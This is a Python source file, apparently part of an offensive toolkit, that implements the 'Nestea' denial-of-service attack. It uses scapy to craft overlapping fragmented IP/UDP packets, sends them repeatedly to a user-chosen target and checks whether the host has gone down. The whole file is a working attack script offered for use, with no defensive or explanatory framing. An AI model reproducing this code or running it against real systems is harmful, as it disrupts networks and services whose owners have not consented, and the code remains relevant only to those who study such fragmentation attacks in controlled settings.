import util
from scapy.all import *
from dos import DoS


class nestea_dos(DoS):
    """ Linux-equivalent to the Teardrop DoS, works on 2.0 and 2.1.
        Attack works by sending fragmented datagram pairs to a host.  The
        first host begins at offset 0 (first packet), with a payload of N.
        The following packet is set to overlap within the previous fragment.
    """
    def __init__(self):
        super(nestea_dos, self).__init__('Nestea DoS')

    def initialize(self):
        # shut scapy up
        conf.verb = 0

        try:
            self.get_ip()
            tmp = raw_input('[!] Nestea DoS IP %s.  Is this correct? '
                                 % self.target)
            if 'n' in tmp.lower():
                return

            pkt1 = IP(dst=self.target, id=42, flags="MF") / UDP() / ("X" * 10)
            pkt2 = IP(dst=self.target, id=42, frag=48) / ("X" * 116)
            pkt3 = IP(dst=self.target, id=42, flags="MF") / UDP() / ("X" * 224)
            while True:
                util.Msg('DoSing %s...' % self.target)
                send(pkt1)
                send(pkt2)
                send(pkt3)

                if self.is_alive():
                    util.Msg('Host appears to still be up.')
                    try:
                        tmp = raw_input('[!] Try again? ')
                    except Exception:
                        break
                    if 'n' in tmp.lower():
                        break
                else:
                    util.Msg('Host not responding!')
                    break
        except KeyboardInterrupt:
            return
        except Exception:
            util.Error('Error with given address.  Could not complete DoS.')
            return
